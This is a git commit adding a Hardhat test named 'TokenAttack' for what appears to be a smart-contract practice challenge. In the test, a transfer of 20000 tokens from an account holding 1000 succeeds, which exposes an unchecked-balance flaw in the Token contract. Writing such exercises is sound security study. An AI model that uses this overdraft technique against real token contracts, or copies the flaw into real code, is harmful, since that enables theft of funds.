4a20a81485ccf4c3a9597cf4efd391787e05e3da
glinda93 <72871001+glinda93@users.noreply.github.com>
2021-12-01 22:41:13 +0900

    add token

---
+++ test/05_token/test_token_attack.ts
@@ -0,0 +1,29 @@
+import { BigNumber } from "@ethersproject/bignumber";
+import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
+import { expect } from "chai";
+import { ethers } from "hardhat";
+import { Token } from "../../typechain";
+
+describe("TokenAttack", function () {
+  let TokenFactory;
+  let token: Token;
+  let owner: SignerWithAddress;
+  let attacker: SignerWithAddress;
+  const initialSupply = 1000;
+
+  beforeEach(async function () {
+    TokenFactory = await ethers.getContractFactory("Token");
+    [owner, attacker] = await ethers.getSigners();
+    token = await TokenFactory.connect(owner).deploy(initialSupply);
+  });
+
+  describe("attack", function () {
+    it("should transfer any amount", async function () {
+      await token.connect(owner).transfer(attacker.address, 20000);
+
+      const balance = await token.balanceOf(attacker.address);
+
+      expect(balance).to.equals(20000);
+    });
+  });
+});
